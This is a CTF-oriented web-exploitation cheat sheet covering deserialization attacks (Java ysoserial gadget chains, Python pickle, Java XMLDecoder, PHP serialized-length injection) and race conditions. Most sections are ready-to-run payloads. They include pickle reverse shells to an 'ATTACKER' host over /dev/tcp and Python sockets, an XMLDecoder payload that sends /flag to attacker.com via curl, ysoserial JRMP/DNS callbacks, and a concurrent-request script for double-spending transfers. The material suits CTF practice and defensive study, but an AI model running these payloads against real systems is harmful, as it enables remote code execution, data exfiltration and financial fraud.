# CTF Web - Deserialization & Execution Attacks

For core injection attacks (SQLi, SSTI, SSRF, XXE, command injection), see [server-side.md](server-side.md).

## Table of Contents
- [Java Deserialization (ysoserial)](#java-deserialization-ysoserial)
- [Python Pickle Deserialization](#python-pickle-deserialization)
- [Race Conditions (TOCTOU)](#race-conditions-toctou)
- [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013)
- [Java XMLDecoder Deserialization RCE (HackIM 2016)](#java-xmldecoder-deserialization-rce-hackim-2016)
- [PHP Serialization Length Manipulation via Filter Word Expansion (0CTF 2016)](#php-serialization-length-manipulation-via-filter-word-expansion-0ctf-2016)

---

## Java Deserialization (ysoserial)

**Pattern:** Java apps using `ObjectInputStream.readObject()` on untrusted input. Serialized Java objects in cookies, POST bodies, or ViewState (base64-encoded, starts with `rO0AB` or hex `aced0005`).

**Detection:**
- Base64 decode suspicious blobs — Java serialized data starts with magic bytes `AC ED 00 05`
- Search for `ObjectInputStream`, `readObject`, `readUnshared` in source
- Content-Type `application/x-java-serialized-object`
- Burp extension: Java Deserialization Scanner

**Key insight:** Deserialization triggers code in `readObject()` methods of classes on the classpath. If a "gadget chain" exists (sequence of classes whose `readObject` → method calls lead to arbitrary execution), the attacker gets RCE without needing to upload code.

```bash
# Generate payloads with ysoserial
java -jar ysoserial.jar CommonsCollections1 'id' | base64
java -jar ysoserial.jar CommonsCollections6 'cat /flag.txt' > payload.ser

# Common gadget chains (try in order):
# CommonsCollections1-7 (Apache Commons Collections)
# CommonsBeanutils1 (Apache Commons BeanUtils)
# URLDNS (no execution — DNS callback for blind detection)
# JRMPClient (triggers JRMP connection)
# Spring1/Spring2 (Spring Framework)

# Blind detection via DNS callback (no RCE needed):
java -jar ysoserial.jar URLDNS 'http://attacker.burpcollaborator.net' | base64

# Send payload
curl -X POST http://target/api -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @payload.ser
```

**Bypass filters:**
- If `ObjectInputStream` subclass blocklists specific classes, try alternative chains
- `ysoserial-modified` and `GadgetProbe` enumerate available gadget classes
- JNDI injection (Java Naming and Directory Interface): `java -jar ysoserial.jar JRMPClient 'attacker:1099'` + `marshalsec` JNDI server
- For Java 17+ (module system restrictions): look for application-specific gadgets or Jackson/Fastjson deserialization instead

---

## Python Pickle Deserialization

**Pattern:** Python apps deserializing untrusted data with `pickle.loads()`, `pickle.load()`, or `shelve`. Common in Flask/Django session cookies, cached objects, ML model files (`.pkl`), Redis-stored objects.

**Detection:**
- Base64 blobs containing `\x80\x04\x95` (pickle protocol 4) or `\x80\x05\x95` (protocol 5)
- Source code: `pickle.loads()`, `pickle.load()`, `_pickle`, `shelve.open()`, `joblib.load()`, `torch.load()`
- Flask sessions with `pickle` serializer (vs default `json`)

**Key insight:** Python's `pickle.loads()` calls `__reduce__()` on deserialized objects, which can return `(os.system, ('command',))` — instant RCE. There is NO safe way to deserialize untrusted pickle data.

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)

# For reverse shell:
class RevShell:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',))

# Using exec for multi-line payloads:
class ExecRCE:
    def __reduce__(self):
        return (exec, ('import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])',))
```

**Bypass restricted unpicklers:**
- `RestrictedUnpickler` may allowlist specific modules — chain through allowed classes
- If `builtins` allowed: `(__builtins__.__import__, ('os',))` then chain `.system()`
- YAML deserialization (`yaml.load()` without `Loader=SafeLoader`) has similar RCE via `!!python/object/apply:os.system`
- NumPy `.npy`/`.npz` files: `numpy.load(allow_pickle=True)` triggers pickle

---

## Race Conditions (TOCTOU)

**Pattern:** Server checks a condition (balance, registration uniqueness, coupon validity) then performs an action in separate steps. Concurrent requests between check and action bypass the validation.

**Key insight:** Send identical requests simultaneously. The server reads the "before" state for all of them, then applies all changes — each request sees the pre-modification state.

```python
import asyncio, aiohttp

async def race(url, data, headers, n=20):
    """Send n identical requests simultaneously"""
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, json=data, headers=headers) for _ in range(n)]
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(r.status, await r.text())

asyncio.run(race('http://target/api/transfer',
    {'to': 'attacker', 'amount': 1000},
    {'Cookie': 'session=...'},
    n=50))
```

**Common CTF race condition targets:**
- **Double-spend / balance bypass:** Transfer or purchase endpoint checked `if balance >= amount` → send 50 simultaneous transfers, all see original balance
- **Coupon/code reuse:** Single-use codes validated then marked used → redeem simultaneously before mark
- **Registration uniqueness:** `if not user_exists(name)` → register same username concurrently, one overwrites the other (admin account takeover)
- **File upload + use:** Upload file, server validates then moves → access file between upload and validation (or between validation and deletion)

```bash
# Turbo Intruder (Burp) — most reliable for precise timing
# Or use curl with GNU parallel:
seq 50 | parallel -j50 curl -s -X POST http://target/api/redeem \
  -H 'Cookie: session=TOKEN' -d 'code=SINGLE_USE_CODE'
```

**Detection in source code:**
- Non-atomic read-then-write patterns without locks/transactions
- `SELECT ... UPDATE` without `FOR UPDATE` or serializable isolation
- File operations: `if os.path.exists()` then `open()` (classic TOCTOU)
- Redis `GET` then `SET` without `WATCH`/`MULTI`

---

## Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)

**Pattern:** Chain multiple pickle operations in a single `pickle.loads()` call by stripping the STOP opcode (`\x2e`) from the first payload and concatenating a second payload.

**Key insight:** The pickle VM executes instructions sequentially. Removing the STOP opcode from the first serialized object causes the deserializer to continue executing the second payload's `__reduce__` call. Combined with `os.dup2()` to redirect stdout to the socket FD, this enables output capture from `os.system()` over the network.

```python
import pickle, os

class Redirect:
    def __reduce__(self):
        return (os.dup2, (5, 1))  # Redirect stdout to socket fd 5

class Execute:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

# Strip STOP opcode from first payload, concatenate second
payload = pickle.dumps(Redirect())[:-1] + pickle.dumps(Execute())
```

**When to use:** Remote pickle deserialization where command output is not returned. Chain `dup2` first to redirect stdout/stderr to the socket, then execute commands.

---

## Java XMLDecoder Deserialization RCE (HackIM 2016)

Java's `XMLDecoder` automatically instantiates classes and invokes methods from XML input. Craft XML to execute arbitrary commands:

```xml
<object class="java.lang.Runtime" method="getRuntime">
  <void method="exec">
    <array class="java.lang.String" length="3">
      <void index="0"><string>/bin/sh</string></void>
      <void index="1"><string>-c</string></void>
      <void index="2"><string>curl attacker.com/?c=$(cat /flag)</string></void>
    </array>
  </void>
</object>
```

**Key insight:** Unlike binary Java deserialization, XMLDecoder provides a text-based gadget-free path to RCE — no gadget chain needed.

---

## PHP Serialization Length Manipulation via Filter Word Expansion (0CTF 2016)

**Pattern:** A post-serialization string filter replaces "where" (5 chars) with "hacker" (6 chars), creating a length mismatch in the serialized string. The serialized length field says N bytes, but after expansion the actual string is longer, causing the PHP deserializer to read past the intended boundary and parse attacker-controlled data as serialized fields.

```php
// The target payload to inject as a serialized field:
$payload = '";}s:5:"photo";s:10:"config.php";}';
// Repeat "where" enough times so the expansion (5->6 per word) overflows
// by exactly strlen($payload) bytes:
$_POST['nickname[]'] = str_repeat("where", strlen($payload)) . $payload;
```

**How it works:**
1. Application serializes user input into `s:170:"wherewhere...PAYLOAD";`
2. Filter replaces each "where" (5) with "hacker" (6), adding 1 byte per occurrence
3. After replacement, actual string is longer than the serialized length field
4. PHP deserializer reads exactly `s:170:` bytes, stops mid-string, and finds the injected `";}s:5:"photo";s:10:"config.php";}` as the next serialized field

**Key insight:** Any post-serialization string expansion or contraction creates exploitable length mismatches for object injection. Look for word filters, censorship, or sanitization applied after `serialize()` but before storage/`unserialize()`.

---
